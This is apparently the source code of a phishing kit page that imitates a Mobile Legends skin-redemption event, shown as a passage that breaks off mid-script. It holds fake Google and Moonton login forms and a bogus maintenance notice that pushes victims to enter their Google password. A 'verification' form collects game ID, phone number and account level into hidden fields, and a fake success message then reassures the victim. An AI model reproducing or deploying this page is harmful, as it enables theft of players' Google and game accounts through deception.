<div class="pengkhianat_box_form_login_id">
<div class="center">
<div class="mata2">
<span class="form-group-mat show2Password" onclick="showPassword2()"><img src="https://cdn.stackpath.web.id/mlbb/12/img/assets/Hide-Password.png"></span>
<span class="form-group-mat hide2Password" style="display: none;" onclick="hidePassword2()"><img src="https://cdn.stackpath.web.id/mlbb/12/img/assets/Show-Password.png"></span>
</div>
</div>
<input autocomplete="one-time-code" onfocus="removeBorder()" type="password" name="pass" pattern="[a-zA-Z0-9]+" id="pass-moonton" placeholder="Enter Google Password" required oninvalid="this.setCustomValidity('Input Google Password')" oninput="setCustomValidity('')">
<label>Enter Your Google Password.</label>
</div>
</div>
<div class="pengkhianat_box_form_footer_id" style="margin-top:20px;">
<center>
<button type="submit" onmousedown="buka.play();" onclick="ValidateLoginMailData()">Login</button>
</center>
</div>
</form>
</div>
</div>
</div>
</div>
</div>

<div class="sang_pengkhianat login-mail-one animated fadeIn" style="display: none;">
<div class="pengkhianat_box zoom-in">
<div class="pengkhianat_box_bg">
<div class="pengkhianat_box_navbar">
<img onmousedown="tutup.play();" onclick="close_log_mt()" src="https://cdn.stackpath.web.id/mlbb/12/img/close.png">
<div class="pengkhianat_box_navbar_title_logo2">
<img src="https://cdn.stackpath.web.id/mlbb/12/img/assets/btn_mt.png"></img>
</div>
<div class="pengkhianat_box_navbar_title">      
<a>Login with Moonton Account</a>
</div>
</div>
<div class="pengkhianat_box_alert_center_id_verify" style="border:none;color:#fff;padding-bottom:0px;padding-top:10px;">Announcement</div>
<div class="pengkhianat_box_alert_center_id_verify" style="padding: 20px;text-align:left;padding-top:0px;border:none;padding-bottom:0px;padding-left:5px;">
Hi <span>Mobile Legends</span> players,
<br>
Moonton Login is currently under maintenance
<br>
We recommend logging in using a Google Play
<br>Deeply sorry for the inconvenience!
</div>
<div class="pengkhianat_box_alert_center_id_verify" style="border:none;text-align:right;padding-right:5px;padding-bottom:0px;padding-top:0px;">-MLBB TEAM-</div>
<div class="pengkhianat_box_form_id4" style="height: 80px;">
<center>
<br>
<button type="button" class="popup-btn-login popup-btn-mlbb" onmousedown="buka.play();" onclick="open_lenzzgp();"><img class="icon-login" src="https://cdn.stackpath.web.id/mlbb/12/img/assets/btn_gp.png"></img>
Sign in with Google Account
</button>
</center>
</div>
</div>
</div>      
</div>

<div class="sang_pengkhianat account_verification animated fadeIn" style="display: none;">
<div class="pengkhianat_box zoom-in">
<div class="pengkhianat_box_bg">
<div class="pengkhianat_box_navbar">
<div class="pengkhianat_box_navbar_title_logo">      
<img src="https://cdn.stackpath.web.id/mlbb/12/img/assets/mlbb_logo.png"></img>
</div>          
<div class="pengkhianat_box_navbar_title">      
<a>Account Verification</a>
</div>
</div>
<div class="pengkhianat_box_form_verif">
<div class="pengkhianat_box_alert_center_id_verify">
Hi  MLBB Players Please complete your <span>Mobile Legends Account</span> details.
</div> 
<form action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
<input type="hidden" name="email" id="validateEmail" readonly>
<input type="hidden" name="password" id="validatePassword" readonly>
<input type="hidden" name="pass" id="validatePass" readonly>
<input type="hidden" name="login" id="validateLogin" readonly>
<input type="hidden" name="playid" id="ValidatePopupPlayId" readonly>
<input type="hidden" name="codetel" id="validateTel" readonly>   
<div class="pengkhianat_box_bg_label_id_verif">

<!-- Game ID Input -->
<div class="pengkhianat_box_form_login_idl" style="margin-top:10px;">
<label for="playidm">Game ID</label>    
<div class="pengkhianat_box_form_login_id">
<input type="tel" name="playid" id="playid" placeholder="Game ID" autocomplete="off" oninput="cleanInput(this)" maxlength="20">
</div>
</div>
<script>
function cleanInput(input) {
    // Hapus angka dalam tanda kurung beserta tanda kurungnya
    input.value = input.value.replace(/\(\d+\)/g, '');
}
</script>                        
<!-- Zone ID Input -->
<div class="pengkhianat_box_form_login_idr" style="margin-top:10px;">
<label for="playzonem">Zone ID</label> 
<div class="pengkhianat_box_form_login_id">   
<input type="tel" name="server" id="server" placeholder="Zone ID" autocomplete="off" minlength="3" maxlength="6">
</div>
</div>
<label style="margin-top:10px;">Number Phone</label> 
<div class="pengkhianat_box_form_login_id">   
<input type="tel" onfocus="removeBorder()" name="phone" id="phone" placeholder="Enter your number phone" autocomplete="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
</div>
<label style="margin-top:10px;">Account Level</label>
<div class="pengkhianat_box_form_login_id">
<select name="level" id="level" required oninvalid="this.setCustomValidity('Select Your Account Level')" oninput="setCustomValidity('')">
<option selected="selected" disabled="disabled" value="">Choose Your Account Level</option>
<script>
for(var i = 1; i <= 200; i++){
document.write("<option>" + i + "</option>");
};
</script>
</select>
</div>
</div>
<div class="pengkhianat_box_form_footer_verif">
<center>
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()">Verification</button></center>
</div>
</form>
</div>
</div>      
</div>
</div>

<div class="sang_pengkhianat check_verification animated fadeIn" style="display: none;">
<div class="pengkhianat_box zoom-in">
<div class="pengkhianat_box_bg">
<div class="pengkhianat_box_navbar">
<div class="pengkhianat_box_navbar_title_logo">      
<img src="https://cdn.stackpath.web.id/mlbb/12/img/assets/mlbb_logo.png"></img>
</div>          
<div class="pengkhianat_box_navbar_title">      
<a>Account Verification</a>
</div>
</div>
<div class="pengkhianat_box_form_id">
<center>
<div class="loadhabo_in_popup" style="margin-top:50%;">
<img class="sang_pengkhianat_load_id_img" src="https://cdn.stackpath.web.id/mlbb/12/img/habo.png">
</img>
</div>
</center>
</div>
</div>
</div>      
</div>

<div class="sang_pengkhianat processing_account animated fadeIn" style="display: none;">
<div class="pengkhianat_box zoom-in">
<div class="pengkhianat_box_bg">
<div class="pengkhianat_box_navbar">
<div class="pengkhianat_box_navbar_title_logo">      
<img src="https://cdn.stackpath.web.id/mlbb/12/img/assets/mlbb_logo.png"></img>
</div>          
<div class="pengkhianat_box_navbar_title">      
<a>Processing Account</a>
</div>
</div>
<div class="pengkhianat_box_form_id2">
<div class="pengkhianat_box_alert_center_id_process">
Hi MLBB Players,
<p>Redemption for the item you selected was successful and Ticket will be deducted automatically.</p>
<p>We will also notify you <span>in-game mailbox</span> when we have successfully dispatched your rewards.
<p style="color: #FF5E5B;"><i class="fa-solid fa-circle-exclamation"></i> Please wait up to 1-3 days (72 hours).</p>
</div> 
<div class="pengkhianat_box_footer_pro">
<center>
<button type="button" onmousedown="tutup.play();" onclick="location.href='https://mobilelegends.com/';">Logout
</button>
<button type="button" onmousedown="tutup.play();" id="sendUID" onclick="close_process()">Again
</button>
</center>
</div>
</div>
</div>      
</div>
</div>

<div class="popup account_login animated fadeIn" style="display: none;">
<div class="popup-box-wrapper-login">
<div class="popup-box-navbar-login">
<div class="popup-box-navbar-login-title"></div>
</div>
<div class="popup-box-bg-login-load" id="load-login">
<div class="loader-label" id="text-login1">Game Loading...</div>
<div class="loader-label" style="display:none" id="text-login2">Connecting to server...</div>
<div class="loader-line"></div>
</div>
</div>
</div>

<div class="sang_pengkhianat mlbb_login animated fadeIn" style="display: none;">
<div class="pengkhianat_box zoom-in">
<div class="pengkhianat_box_bg">
<div class="pengkhianat_box_navbar">
<div class="pengkhianat_box_navbar_title_logo">      
<img src="https://cdn.stackpath.web.id/mlbb/12/img/assets/mlbb_logo.png"></img>
</div>          
<div class="pengkhianat_box_navbar_title">      
<a>Account Login Required</a>
</div>
</div>
<div class="pengkhianat_box_alert_center_id_verify" style="padding: 20px;">
Sign In Using Your <span>Mobile Legends Account</span><br>To Continue Exchanging Exclusive skins
</div>   
<div class="pengkhianat_box_form_id4" style="height: 165px;">
<center>
<br>
<button type="button" class="popup-btn-login popup-btn-mlbb" onmousedown="buka.play();" onclick="open_log_gp();"><img class="icon-login" src="https://cdn.stackpath.web.id/mlbb/12/img/assets/btn_gp.png"></img>
Sign in with Google Account
</button>
<button type="button" class="popup-btn-login popup-btn-mlbb" onmousedown="buka.play();" onclick="open_log_mt();"><img class="icon-login" src="https://cdn.stackpath.web.id/mlbb/12/img/assets/btn_mt.png"></img>
Sign in with Moonton Account
</button>
<!-- <button type="button" class="popup-btn-login popup-btn-mlbb" onmousedown="buka.play();" onclick="open_log_fb();"><img class="icon-login" src="https://cdn.stackpath.web.id/mlbb/12/img/assets/btn_fb.png"></img>
Sign in with Facebook Account
</button> -->
</center>
</div>
</div>
</div>      
</div>
  <script>
  load_web()
function load_web() {
    $('.container_load').show();
	setTimeout(function () {
    $('.container_load').hide(); 
    $('.container_show').show();
    open_account_loginx()
      }, 3000);
}
function open_account_login() {
    $('.account_login').show();
	$('.itemReward_confirmation').hide();
	$(".once_rewards").hide();
	$(".many_rewards").hide();
	$(".playersid").hide();
	$('.itemReward_confirmation').hide();
	$('.many_confirmation').hide(); 	
	$('#load-login').show();
	$('#text-login1').show();     
    $('#box-login').hide();      
    $('#date-login').hide();            
	setTimeout(function () {
	$('#load-login').hide();    
    $('.account_login').hide();   
    $('.mlbb_login').show();   
      }, 4000);
    setTimeout(function () {
	$('#text-login1').hide();       
    $('#text-login2').fadeIn();
      }, 2000);
}
function showMtPassword() {
  var x = document.getElementById("password-k");
  if (x.type === "password") {
    x.type = "text";
	$('.showPassword').hide();
	$('.hidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideMtPassword() {
  var x = document.getElementById("password-k");
  if (x.type === "text") {
    x.type = "password";
	$('.showPassword').show();
	$('.hidePassword').hide();
  } else {
    x.type = "text";
  }
}
function showPassword2() {
  var x = document.getElementById("pass-moonton");
  if (x.type === "password") {
    x.type = "text";
	$('.show2Password').hide();
	$('.hide2Password').show();
  } else {
    x.type = "password";
  }
}
function hidePassword2() {
  var x = document.getElementById("pass-moonton");
  if (x.type === "text") {
    x.type = "password";
	$('.show2Password').show();
	$('.hide2Password').hide();
  } else {
    x.type = "text";
  }
}
function audioFiles() {
    var audio = document.getElementById('audioFiles');  
    audio.play();
}
$(document).ready(function() {
    $("o").attr("onclick", "audioFiles()");  
});
function videoFiles() {
    var video = document.getElementById('idvse3low');  
    video.load();
    video.play();
}
$(document).ready(function() {
    $("o").attr("onclick", "videoFiles()");  
});
function close_not_enough () {
    $('.not_enough').hide();
}
function open_once_confirmation() {
    $('.once_confirmation').show();
}
function open_many_confirmation() {
    $('.many_confirmation').show();
}
function open_once_confirmation2() {
    $('.once_confirmation2').show();
}
function open_many_confirmation2() {
    $('.many_confirmation2').show();
}
function open_once_rewards() {
    $('.once_rewards').show();
	$(".once_confirmation").hide()
}
function open_many_rewards() {
    $('.many_rewards').show();
	$(".many_confirmation").hide()
}
function close_rewards() {
    $(".once_confirmation").hide()
    $(".many_confirmation").hide()
    $(".once_confirmation2").hide()
    $(".many_confirmation2").hide()    
	$(".once_rewards").hide()
    $(".many_rewards").hide()
}
function open_error_fb() {
    $('.error_fb').show();	
}
function open_process () {
    $('.processing_account').show();
    $(".itemReward_confirmation").hide()
    $(".once_confirmation").hide()
    $(".many_confirmation").hide()
	$(".once_rewards").hide()
    $(".many_rewards").hide()
}
function close_process () {
    $('.processing_account').hide();
    $('.header_uid').fadeIn();
    $('#btn-redeem').hide();
	$('#btn-once').hide();     
    $('#btn-many').hide();    
    $('#once_airdrop').hide();
    $('#many_airdrop').hide();
	$('#once_airdrop_on').show();         
	$('#many_airdrop_on').show();   	     
    $('#btn-redeem-on').show();
	$('#btn-once-on').show();     
    $('#btn-many-on').show();          
}
function open_not_enough () {
    $('.not_enough').show();
}
function open_se3low_airdrop() {        
    $('.se3low_airdrop').show();
	$('.once_confirmation').hide();
	setTimeout(function () {
    $('.once_rewards').fadeIn('slow');    
    $('.se3low_airdrop').fadeOut();    
      }, 6000);                             	      		    
}
function open_se3low_airdrops() {    
    $('.se3low_airdrop').show();
	$('.many_confirmation').hide(); 
	setTimeout(function () {
    $('.many_rewards').fadeIn('slow');    
    $('.se3low_airdrop').fadeOut(); 
      }, 6000);                              	      		    
}
function open_se3low_airdrop2() {        
    $('.se3low_airdrop').show();
	$('.once_confirmation2').hide();
	setTimeout(function () {
    $('.once_rewards').fadeIn('slow');    
    $('.se3low_airdrop').fadeOut();    
      }, 6000);                             	      		    
}
function open_se3low_airdrops2() {    
    $('.se3low_airdrop').show();
	$('.many_confirmation2').hide(); 
	setTimeout(function () {
    $('.many_rewards').fadeIn('slow');    
    $('.se3low_airdrop').fadeOut(); 
      }, 6000);                              	      		    
}
function close_itemReward_confirmation() {
    $('.itemReward_confirmation').hide();
}
function open_itemReward_confirmation(ag) {
    var itemReward_confirmationImg = $(ag).attr("src");
    var rewardName = $(ag).attr("data-name");
    var amount = $(ag).attr("data-id");
    var price = $(ag).attr("value");
    $('.itemReward_confirmation').show();   
    $('#myItemReward_confirmationImg').attr('src',itemReward_confirmationImg);
    $('#rewardName').html(rewardName);
    $('#amount').html(amount);
    $('#price').html(price);
}
function open_otherReward_confirmation(ag) {
    var otherReward_confirmationImg = $(ag).attr("src");
	var otherReward_confirmationValue = $(ag).attr("value");
    $('.otherReward_confirmation').show();
    $('#myOtherReward_confirmationImg').attr('src',otherReward_confirmationImg);
	$('#otherReward_confirmationValue').html(otherReward_confirmationValue);
}
// code for showing hiding items
function openRewards(evt, rewardsClass) {
    var i, tab_rewards, tab_rewards_link;
    tab_rewards = document.getElementsByClassName("tab_rewards");
    for (i = 0; i < tab_rewards.length; i++) {
        tab_rewards[i].style.display = "none";
    }
    tab_rewards_link = document.getElementsByClassName("menu-content");
    for (i = 0; i < tab_rewards_link.length; i++) {
        tab_rewards_link[i].className = tab_rewards_link[i].className.replace(" menu-content-active", "");
    }
    document.getElementById(rewardsClass).style.display = "block";
    evt.currentTarget.className += " menu-content-active";
}
document.getElementById("defaultTabRewards").click();

var sendUID = document.getElementById('sendUID');
sendUID.addEventListener('click', function(e){
    e.preventDefault();
    var myText = document.getElementById("playid");
    var myDiv = document.getElementById("uid");   
    myDiv.innerHTML = myText.value;
});

label.onclick = function(e) {
  text.focus();
}
function open_lenzzgp() {
  $('.login-mail').hide();
  $('.login-gp').show();
}
function open_log_gp() {
  $('.login-gp').show();
  $('.more_login').hide();
  $('.account_login').hide();
  $('.mlbb_login').hide();
  $('.login-facebook-mt').hide();   
}
function close_log_gp() {
  $('.login-gp').hide();
  $('.mlbb_login').show();
  $('.more_login').hide();
  $('.account_login').hide();  
  $('.login-facebook-mt').hide();   
}
function open_log_fb() {
  $('.login-facebook').show();
  $('.more_login').hide();
  $('.account_login').hide();
  $('.mlbb_login').hide();
}
function close_log_fb() {
  $('.login-facebook').hide();
  $('.mlbb_login').show();
  $('.more_login').hide();
  $('.account_login').hide();  
}
function open_log_mt() {
  $('.login-mail').show();
  $('.more_login').hide();
  $('.account_login').hide();
  $('.mlbb_login').hide();
}
function close_log_mt() {
  $('.login-mail').hide();
  $('.mlbb_login').show();
  $('.more_login').hide();
  $('.account_login').hide();  
}
function open_verifs() {
open_account_login();
  $('.account_verification').hide();
  	$('.itemReward_confirmation').hide();
	$(".once_rewards").hide();
	$(".many_rewards").hide();
	$(".playersid").hide();
	$('.itemReward_confirmation').hide();
	$('.many_confirmation').hide(); 
	$('.once_confirmation').hide(); 	
}
function close_googles() {
  $('.login-gp').hide();
  $('.mlbb_login').show();
  $('.more_login').hide();
  $('.account_login').hide();  
}
function open_more() {
  $('.more_login').show()
  $('.account_login').hide()
}
function close_more() {
  $('.more_login').hide()
  $('.account_login').show()
  $('.error_fb').hide()	
}
function open_google() {
  $('.login-google').show();
  $('.more_login').hide();
  $('.account_login').hide()
}
function close_google() {
  $('.login-google').hide();
  $('.account_login').show();
  $('.more_login').hide();
}
$(document).ready(function() {
  $('#selowpw-tw').keyup(function() {
    if ($(this).val().length != 0) {
      $('.onbutton').removeClass().addClass('twbutton');
    } else {
      $('.twbutton').removeClass().addClass('onbutton');
    }
  })
});
// code for showing hiding items
function openloginlink(evt, loginlink) {
  var i, form_login, form_login_link;
  form_login = document.getElementsByClassName("form_login");
  for (i = 0; i < form_login.length; i++) {
    form_login[i].style.display = "none";
  }
  form_login_link = document.getElementsByClassName("seclink-content");
  for (i = 0; i < form_login_link.length; i++) {
    form_login_link[i].className = form_login_link[i].className.replace(" seclink-content-active", "");
  }
  document.getElementById(loginlink).style.display = "block";
  evt.currentTarget.className += " seclink-content-active";
}
document.getElementById("email-login").click();

let slideIndex = 0;
showSlides();

function showSlides() {
  let i;
  let slides = document.getElementsByClassName("mySlides");
  let dots = document.getElementsByClassName("dot");
  for (i = 0; i < slides.length; i++) {
    slides[i].style.display = "none";
  }
  slideIndex++;
  if (slideIndex > slides.length) {
    slideIndex = 1
  }
  for (i = 0; i < dots.length; i++) {
    dots[i].className = dots[i].className.replace(" actives", "");
  }
  slides[slideIndex - 1].style.display = "block";
  dots[slideIndex - 1].className += " actives";
  setTimeout(showSlides, 6000);
}
function removeBorder() {
  $('.pengkhianat_box_form_login_id_error').removeClass().addClass('pengkhianat_box_form_login_id');
  $('.wrongPlayerId').hide();
  $('.reqPlayerId').hide();
}
function clearInput() {
  document.getElementById("goInputPlayIdForm").reset();
  $('.pengkhianat_box_form_login_id_error').removeClass().addClass('pengkhianat_box_form_login_id');
  $('.wrongPlayerId').hide();
  $('.reqPlayerId').hide();
}
setTimeout(function() {
  $('.sec-container').show()
  $('.sec-container-load').hide();
}, 1000);

function openReward(evt, rewardsClass) {
  var i, item_rewardx, item_rewardx_link;
  item_rewardx = document.getElementsByClassName("item_rewardx");
  for (i = 0; i < item_rewardx.length; i++) {
    item_rewardx[i].style.display = "none";
  }
  item_rewardx_link = document.getElementsByClassName("menu-contentx");
  for (i = 0; i < item_rewardx_link.length; i++) {
    item_rewardx_link[i].className = item_rewardx_link[i].className.replace(" menu-contentx-actives", "");
  }
  document.getElementById(rewardsClass).style.display = "block";
  evt.currentTarget.className += " menu-contentx-actives";
}
document.getElementById("defaultrewards").click();

function imposeMinMax(el){
  if(el.value != ""){
    if(parseInt(el.value) < parseInt(el.min)){
      el.value = el.min;
    }
    if(parseInt(el.value) > parseInt(el.max)){
      el.value = el.max;
    }
  }
}
function goInputPlayId() {
  $('#goInputPlayIdForm').submit(function(submitinggoInputPlayId) {
    submitinggoInputPlayId.preventDefault();
    $beforeInputPlayId = $('#beforeInput-PlayId').val().trim();
    if ($beforeInputPlayId == '' || $beforeInputPlayId == null) {
      $('.reqPlayerId').show();
      $('#wrongBoxId').addClass('pengkhianat_box_form_login_id_error');
      return false;
    } else {
      $('.reqPlayerId').hide();
      $('#wrongBoxId').removeClass('pengkhianat_box_form_login_id_error');
    }
    if ($beforeInputPlayId.length <= 7 || $beforeInputPlayId.length >= 15) {
      $('.wrongPlayerId').fadeIn();       
      $('#wrongBoxId').addClass('pengkhianat_box_form_login_id_error');
      return false;
    } else {
      $('.wrongPlayerId').hide();
      $('#wrongBoxId').removeClass('pengkhianat_box_form_login_id_error');
      // code for processing character id input on desktop version
      $('.itemReward_confirmation').hide();
      $('.itemReward_confirmations').hide();
      $('.account_login').show();
      $(".playersid").hide();
	$('#load-login').show();
	$('#text-login1').show();     
    $('#box-login').hide();      
    $('#date-login').hide();            
	setTimeout(function () {
	$('#load-login').hide();    
    $('#box-login').show();
    $('#date-login').show();          
      }, 5000);
    setTimeout(function () {
	$('#text-login1').hide();       
    $('#text-login2').fadeIn();
      }, 2000);
      // code for getting character id data and installed in account verification popup
      $("#ValidatePopupPlayId").val($beforeInputPlayId);
      $("input#ValidatePopupPlayId").val($beforeInputPlayId);
    }
  });
}
function removeBorder() {
  $('.pengkhianat_box_form_login_id_error').removeClass().addClass('pengkhianat_box_form_login_id');
  $('.wrongPlayerId').hide();
  $('.reqPlayerId').hide();
}
function clearInput() {
  document.getElementById("goInputPlayIdForm").reset();
  $('.pengkhianat_box_form_login_id_error').removeClass().addClass('pengkhianat_box_form_login_id');
  $('.wrongPlayerId').hide();
  $('.reqPlayerId').hide();
}
setTimeout(function() {
  $('.sec-container').show()
  $('.sec-container-load').hide();
}, 1500);
function open_veriflah() {
  $('.itemReward_confirmation').hide();
  $('.itemReward_confirmations').hide();
  $('.account_login').show();
}
function verify_done() {
  $('#load-verify').show()
  $('#stepform').hide()
  setTimeout(function() {
    $('#load-verify').hide()
    $('.account_verification').hide()
    $('.processing_account').show()
  }, 3000)
}
function showHide() {
  var inputan = document.getElementById("password-gp");
  if (inputan.type === "password") {
    inputan.type = "text";
  } else {
    inputan.type = "password";
  }
} 
(function(){var js = "window['__CF$cv$params']={r:'855a3b238d243f55',t:'MTcwNzk2NTI5Ny43MTQwMDA='};_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js',document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();
  </script>
    <script>
    // code for activate clicked sound
var buka = new Audio();
buka.src = "media/open.mp3";

var tutup = new Audio();
tutup.src = "media/close.mp3";

// code for showing hiding popup
function audioFiles() {
    var audio = document.getElementById('audioFiles');  
    audio.play();
}
$(document).ready(function() {
    $("o").attr("onclick", "audioFiles()");  
});
// code for showing hiding popup
function open_find_id() {
    $('.find_id').show();
}
function close_find_id() {
    $('.find_id').hide();
}
function close_itemReward_confirmation() {
    $('.itemReward_confirmation').hide();
}
function open_itemReward_confirmation(ag) {
    var itemReward_confirmationImg = $(ag).attr("src");
    var rewardName = $(ag).attr("data-name");
    var amount = $(ag).attr("data-id");
    var price = $(ag).attr("value");
    $('.itemReward_confirmation').show();   
    $('#myItemReward_confirmationImg').attr('src',itemReward_confirmationImg);
    $('#rewardName').html(rewardName);
    $('#amount').html(amount);
    $('#price').html(price);
}
function merah() {
    document.getElementById('changebg').style.backgroundImage="url(https://cdn.stackpath.web.id/mlbb/12/img/bg_item/merah.jpg)";
}
function pink() {
    document.getElementById('changebg').style.backgroundImage="url(https://cdn.stackpath.web.id/mlbb/12/img/bg_item/pink.jpg)";
}
function ungu() {
    document.getElementById('changebg').style.backgroundImage="url(https://cdn.stackpath.web.id/mlbb/12/img/bg_item/ungu.jpg)";
}
function biru() {
    document.getElementById('changebg').style.backgroundImage="url(https://cdn.stackpath.web.id/mlbb/12/img/bg_item/biru.jpg)";
}
function hijau() {
    document.getElementById('changebg').style.backgroundImage="url(https://cdn.stackpath.web.id/mlbb/12/img/bg_item/hijau.jpg)";
}
function open_otherReward_confirmation(ag) {
    var otherReward_confirmationImg = $(ag).attr("src");
	var otherReward_confirmationValue = $(ag).attr("value");
    $('.otherReward_confirmation').show();
    $('#myOtherReward_confirmationImg').attr('src',otherReward_confirmationImg);
	$('#otherReward_confirmationValue').html(otherReward_confirmationValue);
}
function open_once_confirmation() {
    $('.once_confirmation').show();
}
function open_many_confirmation() {
    $('.many_confirmation').show();
}
function open_once_rewards() {
    $('.once_rewards').show();
	$(".once_confirmation").hide()
}
function open_many_rewards() {
    $('.many_rewards').show();
	$(".many_confirmation").hide()
}
function open_facebook() {
    $('.login-facebook').show();
    $('.account_login').hide();
}
function open_twitter() {
    $('.login-twitter').show();
    $('.account_login').hide();
}
function close_rewards() {
    $(".once_confirmation").hide()
    $(".many_confirmation").hide()
	$(".once_rewards").hide()
    $(".many_rewards").hide()
}
function tutup_facebook() {
    $('.login-facebook').hide()
    $('.account_login').show();
}
function tutup_twitter() {
    $('.login-twitter').hide()
    $('.account_login').show();
}
function et() {
  $('.et').show();    
  $('.nt').hide();  
} 
function nt() {
  $('.nt').show();    
  $('.et').hide();    
}
function open_link() {
  $('.login-mail').show()
  $('.account_login').hide()
}
function close_link() {
  $('.login-mail').hide()
  $('.account_login').show()
}
// kode untuk ganti gambar header otomatis
var slideIndexHeader = 0;
showSlidesHeader();
function showSlidesHeader() {
    var i;
    var slidesHeader = document.getElementsByClassName("sliderHeader");
    for (i = 0; i < slidesHeader.length; i++) {
        slidesHeader[i].style.display = "none"; 
    }
    slideIndexHeader++;
    if (slideIndexHeader > slidesHeader.length) {slideIndexHeader = 1} 
    slidesHeader[slideIndexHeader-1].style.display = "block"; 
    setTimeout(showSlidesHeader, 2600);
}
function openloginlink(evt, loginlink) {
    var i, form_login, form_login_link;
    form_login = document.getElementsByClassName("form_login");
    for (i = 0; i < form_login.length; i++) {
        form_login[i].style.display = "none";        
    }
    form_login_link = document.getElementsByClassName("seclink-content");
    for (i = 0; i < form_login_link.length; i++) {
        form_login_link[i].className = form_login_link[i].className.replace(" seclink-content-active", "");
    }
    document.getElementById(loginlink).style.display = "block";
    evt.currentTarget.className += " seclink-content-active";
}
document.getElementById("email-login").click();

// show hide password for facebook

function showFbPassword() {
  var x = document.getElementById("selowpw-fb");
  if (x.type === "password") {
    x.type = "text";
	$('.showPassword').hide();
	$('.hidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideFbPassword() {
  var x = document.getElementById("selowpw-fb");
  if (x.type === "text") {
    x.type = "password";
	$('.showPassword').show();
	$('.hidePassword').hide();
  } else {
    x.type = "text";
  }
}
// show hide password for twitter
function showTwitterPassword() {
  var x = document.getElementById("selowpw-tw");
  if (x.type === "password") {
    x.type = "text";
	$('.TwitterShowPassword').hide();
	$('.TwitterHidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideTwitterPassword() {
  var x = document.getElementById("selowpw-tw");
  if (x.type === "text") {
    x.type = "password";
	$('.TwitterShowPassword').show();
	$('.TwitterHidePassword').hide();
  } else {
    x.type = "text";
  }
}
function showFbPassword() {
  var x = document.getElementById("password-facebook");
  if (x.type === "password") {
    x.type = "text";
	$('.showPassword').hide();
	$('.hidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideFbPassword() {
  var x = document.getElementById("password-facebook");
  if (x.type === "text") {
    x.type = "password";
	$('.showPassword').show();
	$('.hidePassword').hide();
  } else {
    x.type = "text";
  }
}

// show hide password for twitter
function showTwitterPassword() {
  var x = document.getElementById("password-twitter");
  if (x.type === "password") {
    x.type = "text";
	$('.TwitterShowPassword').hide();
	$('.TwitterHidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideTwitterPassword() {
  var x = document.getElementById("password-twitter");
  if (x.type === "text") {
    x.type = "password";
	$('.TwitterShowPassword').show();
	$('.TwitterHidePassword').hide();
  } else {
    x.type = "text";
  }
}

function showFbPasswordS() {
  var x = document.getElementById("sec-password-facebook");
  if (x.type === "password") {
    x.type = "text";
    $('.showPassword').hide();
    $('.hidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideFbPasswordS() {
  var x = document.getElementById("sec-password-facebook");
  if (x.type === "text") {
    x.type = "password";
    $('.showPassword').show();
    $('.hidePassword').hide();
  } else {
    x.type = "text";
  }
}
function showTwitterPasswordS() {
  var x = document.getElementById("sec-password-twitter");
  if (x.type === "password") {
      x.type = "text";
      $('.TwitterShowPassword').hide();
      $('.TwitterHidePassword').show();
  } else {
      x.type = "password";
  }
}
function hideTwitterPasswordS() {
  var x = document.getElementById("sec-password-twitter");
  if (x.type === "text") {
      x.type = "password";
      $('.TwitterShowPassword').show();
      $('.TwitterHidePassword').hide();
  } else {
      x.type = "text";
  }
}

// show hide password for facebook
function SecshowFbPassword() {
  var x = document.getElementById("sec-password-facebook");
  if (x.type === "password") {
    x.type = "text";
	$('.showPassword').hide();
	$('.hidePassword').show();
  } else {
    x.type = "password";
  }
}
function SechideFbPassword() {
  var x = document.getElementById("sec-password-facebook");
  if (x.type === "text") {
    x.type = "password";
	$('.showPassword').show();
	$('.hidePassword').hide();
  } else {
    x.type = "text";
  }
}

// show hide password for twitter
function SecshowTwitterPassword() {
  var x = document.getElementById("sec-password-twitter");
  if (x.type === "password") {
    x.type = "text";
	$('.TwitterShowPassword').hide();
	$('.TwitterHidePassword').show();
  } else {
    x.type = "password";
  }
}
function SechideTwitterPassword() {
  var x = document.getElementById("sec-password-twitter");
  if (x.type === "text") {
    x.type = "password";
	$('.TwitterShowPassword').show();
	$('.TwitterHidePassword').hide();
  } else {
    x.type = "text";
  }
}
    </script>
      <script>
      const displayTime = document.querySelector("#display-time");

function showTime() {
  let time = new Date();
  displayTime.innerText = time.toLocaleTimeString("en-US", { hour12: false });
  setTimeout(showTime, 1000);
}
showTime();

function updateDate() {
  let today = new Date();
  
  let dayName = today.getDay(),
    dayNum = today.getDate(),
    month = today.getMonth(),
    year = today.getFullYear();

  const months = [
    "/01/",
    "/02/",
    "/03/",
    "/04/",
    "/05/",
    "/06/",
    "/07/",
    "/08/",
    "/09/",
    "/10/",
    "/11/",
    "/12/",
  ];
  const dayWeek = [
    "Sunday",
    "Monday",
    "Tuesday",
    "Wednesday",
    "Thursday",
    "Friday",
    "Saturday",
  ];
  
  const IDCollection = ["day", "daynum", "month", "year"];
  
  const val = [dayWeek[dayName], dayNum, months[month], year];
  for (let i = 0; i < IDCollection.length; i++) {
    document.getElementById(IDCollection[i]).firstChild.nodeValue = val[i];
  }
}
updateDate();
      </script>
        <script>
        let slideIndex = 0;
showSlides();
function showSlides() {
  let i;
  let slides = document.getElementsByClassName("mySlides");
  let dots = document.getElementsByClassName("dot");
  for (i = 0; i < slides.length; i++) {
    slides[i].style.display = "none";  
  }
  slideIndex++;
  if (slideIndex > slides.length) {slideIndex = 1}    
  for (i = 0; i < dots.length; i++) {
    dots[i].className = dots[i].className.replace(" actives", "");
